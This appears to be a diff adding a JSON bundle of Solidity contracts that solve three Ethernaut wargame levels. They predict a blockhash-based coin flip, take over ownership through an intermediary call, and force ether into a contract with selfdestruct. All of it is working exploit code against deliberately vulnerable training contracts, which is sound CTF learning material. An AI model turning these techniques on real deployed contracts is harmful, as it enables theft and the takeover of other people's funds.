@@ -1,0 +1,26 @@
+{
+  "ethernaut/coinflip.sol": {
+    "__sources__": {
+      "ethernaut/coinflip.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// This tells your contract that the target has a \"flip\" function it can call\ninterface CoinFlip {\n    function flip(bool _guess) external returns (bool);\n}\n\ncontract CoinFlipHack {\n\n    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    // This function runs the cheat calculations and instantly forwards the right answer\n    function hackFlip(address _ethernautLevelAddress) public {\n\n        // Calculate the exact \"random\" answer for the CURRENT block\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool perfectGuess = (coinFlip == 1 ? true : false);\n\n        // Link the interface to the target Ethernaut contract address\n        CoinFlip targetContract = CoinFlip(_ethernautLevelAddress);\n\n        // Fire the perfect guess directly into the Ethernaut contract\n        targetContract.flip(perfectGuess);\n    }\n}",
+        "file": "ethernaut/coinflip.sol"
+      }
+    }
+  },
+  "ethernaut/telephone.sol": {
+    "__sources__": {
+      "ethernaut/telephone.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// This tells your contract that the target has a \"flip\" function it can call\ninterface Telephone {\n    function changeOwner(address _owner) external;\n}\n\ncontract hackTel {\n    address public owner;\n\n    function hackOwner(address _ethernautLevelAddress) public {\n        Telephone(_ethernautLevelAddress).changeOwner(msg.sender);\n    }\n}\n\n",
+        "file": "ethernaut/telephone.sol"
+      }
+    }
+  },
+  "ethernaut/force.sol": {
+    "__sources__": {
+      "ethernaut/force.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract ForceAttacker {\n    \n    constructor(address payable _targetInstanceAddress) payable {\n        // selfdestruct takes 100% of the deployment value and forces it into the target\n        selfdestruct(_targetInstanceAddress);\n    }\n}",
+        "file": "ethernaut/force.sol"
+      }
+    }
+  }
+}
